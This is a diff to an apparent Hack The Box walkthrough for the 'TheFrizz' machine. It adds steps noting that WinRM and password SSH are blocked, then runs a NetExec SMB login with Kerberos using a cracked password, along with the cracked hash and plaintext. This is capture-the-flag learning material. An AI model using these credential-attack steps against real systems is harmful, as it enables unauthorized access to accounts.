@@ -143,13 +143,21 @@ Put all the data in a `hash.txt` file in format `username:hash:salt` as that is 
 And we have the password cracked! `067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03:/aACFhikmNopqrRTVz2489:Jenni_Luvs_Magic23`
 
 Now we can simply `ssh` to the machine!
-Well, no! The firewall will block it. The S We cannot use `evil-winrm` as the firewall has blocked the ports!
+Well, no! The firewall will block it. The SSH is configured to not be accessed via password. We cannot use `evil-winrm` as the firewall has blocked the ports!
 ```
 PORT     STATE    SERVICE VERSION
 5985/tcp filtered wsman
 5986/tcp filtered wsmans
 ```
 
+We need to get Kerberos credentials. We can do so via the SMB service using NetExec.
+```
+┌─[htb_lab_truelyyours]─[10.10.16.82]─[truelyyours@parrot]─[~/htb/thefrizz]
+└──╼ [★]$ nxc smb -k 10.10.11.60 -u 'f.frizzle' -p 'Jenni_Luvs_Magic23'
+SMB         10.10.11.60     445    frizzdc          [*]  x64 (name:frizzdc) (domain:frizz.htb) (signing:True) (SMBv1:False) (NTLM:False)
+SMB         10.10.11.60     445    frizzdc          [-] frizz.htb\f.frizzle:Jenni_Luvs_Magic23 KRB_AP_ERR_SKEW
+```
 
+But the clock is skew so do `sudo ntpdate 10.10.11.60` and rerun the command
 
 
